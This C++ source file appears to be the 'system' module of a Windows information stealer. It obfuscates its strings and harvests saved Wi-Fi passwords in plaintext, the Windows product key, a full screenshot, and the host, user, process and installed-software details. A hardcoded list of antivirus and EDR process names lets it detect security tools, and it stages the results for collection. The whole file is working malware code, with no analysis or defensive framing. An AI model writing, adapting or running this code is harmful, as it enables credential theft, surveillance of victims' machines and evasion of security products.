// System module: hardware/software inventory, screenshot, wifi credentials,
// product keys, process list with AV detection.
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"
#include "../core/http.h"
#include "../core/b64.h"
#include "../core/log.h"

#include <windows.h>
typedef ULONG PROPID; // mingw gdiplus headers require it explicitly
#include <gdiplus.h>
#include <wlanapi.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <intrin.h>
#include <sstream>
#include <iomanip>
#include <fstream>

#ifdef _MSC_VER
#pragma comment(lib, "gdiplus.lib")
#endif
#ifdef _MSC_VER
#pragma comment(lib, "wlanapi.lib")
#endif
#ifdef _MSC_VER
#pragma comment(lib, "advapi32.lib")
#endif

namespace {

std::string cpu_name() {
    HKEY k = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            util::widen(OBF("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0")).c_str(),
            0, KEY_READ, &k) == ERROR_SUCCESS) {
        wchar_t v[512] = {};
        DWORD sz = sizeof(v), type = 0;
        RegQueryValueExW(k, L"ProcessorNameString", nullptr, &type, (LPBYTE)v, &sz);
        RegCloseKey(k);
        return util::narrow(v);
    }
    return "";
}

std::string gpu_name() {
    HKEY k = nullptr;
    std::string result;
    // enumerate display adapters
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            util::widen(OBF("SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}")).c_str(),
            0, KEY_READ, &k) == ERROR_SUCCESS) {
        DWORD idx = 0;
        for (DWORD i = 0; i < 16; ++i) {
            wchar_t sub[16];
            swprintf(sub, 16, L"%04lu", i);
            HKEY sk = nullptr;
            if (RegOpenKeyExW(k, sub, 0, KEY_READ, &sk) != ERROR_SUCCESS) continue;
            wchar_t v[512] = {};
            DWORD sz = sizeof(v), type = 0;
            if (RegQueryValueExW(sk, L"DriverDesc", nullptr, &type, (LPBYTE)v, &sz) == ERROR_SUCCESS) {
                if (!result.empty()) result += " | ";
                result += util::narrow(v);
            }
            RegCloseKey(sk);
        }
        RegCloseKey(k);
    }
    return result;
}

std::string os_version() {
    // RtlGetVersion gives the real build (GetVersionEx lies on win8.1+)
    auto ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll) {
        using RtlGetVersion_t = LONG(WINAPI*)(PRTL_OSVERSIONINFOW);
        auto fn = (RtlGetVersion_t)GetProcAddress(ntdll, OBF("RtlGetVersion").c_str());
        if (fn) {
            RTL_OSVERSIONINFOW vi{};
            vi.dwOSVersionInfoSize = sizeof(vi);
            if (fn(&vi) == 0) {
                // product name from registry
                std::string name;
                HKEY k = nullptr;
                if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                        util::widen(OBF("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")).c_str(),
                        0, KEY_READ, &k) == ERROR_SUCCESS) {
                    wchar_t v[512] = {};
                    DWORD sz = sizeof(v), type = 0;
                    if (RegQueryValueExW(k, L"ProductName", nullptr, &type, (LPBYTE)v, &sz) == ERROR_SUCCESS)
                        name = util::narrow(v);
                    RegCloseKey(k);
                }
                std::ostringstream ss;
                ss << name << " " << vi.dwMajorVersion << "." << vi.dwMinorVersion << "." << vi.dwBuildNumber;
                return ss.str();
            }
        }
    }
    return "Windows";
}

// ---- Windows product key decode (well-known algorithm) ----
std::string decode_product_key(const std::vector<uint8_t>& id) {
    static const char chars[] = "BCDFGHJKMPQRTVWXY2346789";
    std::vector<uint8_t> key(id.begin() + 52, id.begin() + 52 + 15);
    std::string out;
    for (int i = 24; i >= 0; --i) {
        int c = 0;
        for (int j = 14; j >= 0; --j) {
            c = (c << 8) | key[j];
            key[j] = (uint8_t)(c / 24);
            c %= 24;
        }
        out.insert(out.begin(), chars[c]);
    }
    std::string formatted;
    for (size_t i = 0; i < out.size(); ++i) {
        if (i && i % 5 == 0) formatted += '-';
        formatted += out[i];
    }
    return formatted;
}

std::string windows_product_key() {
    HKEY k = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            util::widen(OBF("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion")).c_str(),
            0, KEY_READ | KEY_WOW64_64KEY, &k) != ERROR_SUCCESS)
        return "";
    std::vector<uint8_t> blob(164);
    DWORD sz = (DWORD)blob.size(), type = 0;
    LONG rc = RegQueryValueExW(k, L"DigitalProductId", nullptr, &type, blob.data(), &sz);
    RegCloseKey(k);
    if (rc != ERROR_SUCCESS || sz < 67) return "";
    return decode_product_key(blob);
}

// ---- AV / security product enumeration ----
std::string installed_av() {
    std::string result;
    HKEY root = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            util::widen(OBF("SOFTWARE\\Microsoft\\Windows Defender")).c_str(),
            0, KEY_READ, &root) == ERROR_SUCCESS) {
        RegCloseKey(root);
        result = "Windows Defender";
    }
    // third-party via Security Center
    HKEY sc = nullptr;
    std::wstring path = util::widen(OBF("SOFTWARE\\Microsoft\\Security Center\\Provider"));
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path.c_str(), 0, KEY_READ, &sc) == ERROR_SUCCESS) {
        // enumerate subkeys (each provider = product)
        wchar_t name[256];
        for (DWORD i = 0; RegEnumKeyW(sc, i, name, 256) == ERROR_SUCCESS; ++i) {
            std::wstring sub = path + L"\\" + name;
            HKEY pk = nullptr;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, sub.c_str(), 0, KEY_READ, &pk) == ERROR_SUCCESS) {
                wchar_t v[512] = {}; DWORD sz = sizeof(v), type = 0;
                if (RegQueryValueExW(pk, L"DisplayName", nullptr, &type, (LPBYTE)v, &sz) == ERROR_SUCCESS) {
                    if (!result.empty()) result += " | ";
                    result += util::narrow(v);
                }
                RegCloseKey(pk);
            }
        }
        RegCloseKey(sc);
    }
    return result.empty() ? "none" : result;
}

// ---- screenshot via GDI+ ----
std::vector<uint8_t> screenshot_png() {
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int cx = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int cy = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    if (cx <= 0 || cy <= 0) { cx = GetSystemMetrics(SM_CXSCREEN); cy = GetSystemMetrics(SM_CYSCREEN); x = y = 0; }

    HDC screen = GetDC(nullptr);
    HDC mem = CreateCompatibleDC(screen);
    HBITMAP bmp = CreateCompatibleBitmap(screen, cx, cy);
    HGDIOBJ old = SelectObject(mem, bmp);
    BitBlt(mem, 0, 0, cx, cy, screen, x, y, SRCCOPY);
    SelectObject(mem, old);
    DeleteDC(mem);
    ReleaseDC(nullptr, screen);

    // encode PNG via GDI+
    std::vector<uint8_t> out;
    Gdiplus::Bitmap bmpobj(bmp, nullptr);
    IStream* stream = nullptr;
    if (CreateStreamOnHGlobal(nullptr, TRUE, &stream) == S_OK) {
        CLSID pngClsid{};
        // PNG encoder CLSID
        pngClsid = {0x557cf406, 0x1a04, 0x11d3, {0x9a, 0x73, 0x00, 0x00, 0xf8, 0x1e, 0xf3, 0x2e}};
        if (bmpobj.Save(stream, &pngClsid, nullptr) == Gdiplus::Ok) {
            LARGE_INTEGER li{}; li.QuadPart = 0;
            stream->Seek(li, STREAM_SEEK_SET, nullptr);
            STATSTG stat{};
            stream->Stat(&stat, STATFLAG_NONAME);
            size_t size = (size_t)stat.cbSize.QuadPart;
            out.resize(size);
            ULONG read = 0;
            stream->Read(out.data(), (ULONG)size, &read);
            out.resize(read);
        }
        stream->Release();
    }
    DeleteObject(bmp);
    return out;
}

// ---- wifi via wlanapi ----
std::string wifi_profiles() {
    std::ostringstream ss;
    HANDLE h = nullptr;
    DWORD version = 0;
    if (WlanOpenHandle(2, nullptr, &version, &h) != ERROR_SUCCESS) return "";
    PWLAN_INTERFACE_INFO_LIST ifaces = nullptr;
    if (WlanEnumInterfaces(h, nullptr, &ifaces) != ERROR_SUCCESS) { WlanCloseHandle(h, nullptr); return ss.str(); }

    for (DWORD i = 0; i < ifaces->dwNumberOfItems; ++i) {
        PWLAN_PROFILE_INFO_LIST profiles = nullptr;
        if (WlanGetProfileList(h, &ifaces->InterfaceInfo[i].InterfaceGuid, nullptr, &profiles) != ERROR_SUCCESS)
            continue;
        for (DWORD j = 0; j < profiles->dwNumberOfItems; ++j) {
            DWORD flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
            LPWSTR xml = nullptr;
            DWORD access = 0;
            if (WlanGetProfile(h, &ifaces->InterfaceInfo[i].InterfaceGuid,
                               profiles->ProfileInfo[j].strProfileName, nullptr, &xml, &flags, &access) == ERROR_SUCCESS) {
                std::wstring wx(xml);
                std::string name = util::narrow(profiles->ProfileInfo[j].strProfileName);
                std::string key;
                // <keyMaterial>...</keyMaterial>
                auto pos = wx.find(L"<keyMaterial>");
                if (pos != std::wstring::npos) {
                    auto end = wx.find(L"</keyMaterial>", pos);
                    if (end != std::wstring::npos)
                        key = util::narrow(wx.substr(pos + 13, end - pos - 13));
                }
                ss << name << " : " << (key.empty() ? "(open or hidden)" : key) << "\r\n";
                WlanFreeMemory(xml);
            }
        }
        WlanFreeMemory(profiles);
    }
    WlanFreeMemory(ifaces);
    WlanCloseHandle(h, nullptr);
    return ss.str();
}

std::string local_ip() {
    ULONG size = 0;
    GetAdaptersInfo(nullptr, &size);
    if (!size) return "";
    std::vector<uint8_t> buf(size);
    auto info = (PIP_ADAPTER_INFO)buf.data();
    if (GetAdaptersInfo(info, &size) != NO_ERROR) return "";
    for (auto a = info; a; a = a->Next) {
        std::string ip = a->IpAddressList.IpAddress.String;
        if (!ip.empty() && ip != "0.0.0.0" && ip != "127.0.0.1")
            return ip;
    }
    return "";
}

std::string av_process_hits() {
    static const char* edr[] = {
        "MsMpEng.exe", "NisSrv.exe", "avp.exe", "avastsvc.exe", "avgnt.exe",
        "bdagent.exe", "ekrn.exe", "egui.exe", "zlclient.exe", "kavfs.exe",
        "sophoshealth.exe", "csfalconservice.exe", "cb.exe", "sentinelagent.exe",
        "mdatp", "edr", "xagt.exe", "mfemms.exe", "windefend",
    };
    std::string hits;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return hits;
    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            std::string exe = util::to_lower(util::narrow(pe.szExeFile));
            for (const char* e : edr) {
                std::string le = util::to_lower(e);
                if (exe.find(le) != std::string::npos) {
                    if (!hits.empty()) hits += ", ";
                    hits += util::narrow(pe.szExeFile);
                    break;
                }
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return hits;
}

std::string installed_software_list() {
    std::ostringstream ss;
    const wchar_t* roots[] = {
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
    };
    for (auto root : roots) {
        HKEY k = nullptr;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, root, 0, KEY_READ, &k) != ERROR_SUCCESS) continue;
        wchar_t sub[256];
        for (DWORD i = 0; RegEnumKeyW(k, i, sub, 256) == ERROR_SUCCESS; ++i) {
            HKEY sk = nullptr;
            if (RegOpenKeyExW(k, sub, 0, KEY_READ, &sk) != ERROR_SUCCESS) continue;
            wchar_t name[512] = {}, ver[64] = {};
            DWORD sz = sizeof(name), type = 0;
            if (RegQueryValueExW(sk, L"DisplayName", nullptr, &type, (LPBYTE)name, &sz) == ERROR_SUCCESS) {
                sz = sizeof(ver);
                RegQueryValueExW(sk, L"DisplayVersion", nullptr, &type, (LPBYTE)ver, &sz);
                ss << util::narrow(name) << " " << util::narrow(ver) << "\r\n";
            }
            RegCloseKey(sk);
        }
        RegCloseKey(k);
    }
    return ss.str();
}

std::string process_list() {
    std::ostringstream ss;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return ss.str();
    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            ss << util::narrow(pe.szExeFile) << " (pid " << pe.th32ProcessID << ")\r\n";
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return ss.str();
}

UINT_PTR get_encoder_clsid(const wchar_t* format, CLSID* clsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (!size) return 0;
    std::vector<uint8_t> buf(size);
    auto codecs = (Gdiplus::ImageCodecInfo*)buf.data();
    Gdiplus::GetImageEncoders(num, size, codecs);
    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(codecs[i].MimeType, format) == 0) { *clsid = codecs[i].Clsid; return i + 1; }
    }
    return 0;
}

} // namespace

namespace mod {

void system(const std::string& staging) {
    std::ostringstream info;
    info << "=== system ===\r\n";
    info << "hostname: " << util::env("COMPUTERNAME") << "\r\n";
    info << "username: " << util::env("USERNAME") << "\r\n";
    info << "domain: " << util::env("USERDOMAIN") << "\r\n";
    info << "os: " << os_version() << "\r\n";
    info << "cpu: " << cpu_name() << "\r\n";
    info << "gpu: " << gpu_name() << "\r\n";
    info << "arch: " << (sizeof(void*) == 8 ? "x64" : "x86") << "\r\n";

    MEMORYSTATUSEX ms{};
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    info << "ram: " << (ms.ullTotalPhys / (1024ull * 1024 * 1024)) << " GB\r\n";

    SYSTEM_INFO si{};
    GetSystemInfo(&si);
    info << "cores: " << si.dwNumberOfProcessors << "\r\n";
    info << "elevated: " << (util::is_elevated() ? "yes" : "no") << "\r\n";
    info << "uptime_s: " << (GetTickCount64() / 1000) << "\r\n";
    info << "local_ip: " << local_ip() << "\r\n";

    info << "av: " << installed_av() << "\r\n";
    info << "av_processes: " << av_process_hits() << "\r\n";

    // screen
    info << "screen: " << GetSystemMetrics(SM_CXVIRTUALSCREEN) << "x" << GetSystemMetrics(SM_CYVIRTUALSCREEN) << "\r\n";

    std::string pk = windows_product_key();
    info << "product_key: " << (pk.empty() ? "(unavailable)" : pk) << "\r\n";

    info << "\r\n=== wifi ===\r\n" << wifi_profiles();
    info << "\r\n=== processes ===\r\n" << process_list();
    info << "\r\n=== installed software ===\r\n" << installed_software_list();

    stage::stage_text("system", "system.txt", info.str());
    stage::note("system", "inventory written");

    if (cfg::COLLECT_SCREENSHOT) {
        auto png = screenshot_png();
        if (!png.empty()) {
            stage::stage_bytes("system", "screenshot.png", png);
            stage::note("system", "screenshot ok");
        }
    }
}

} // namespace mod
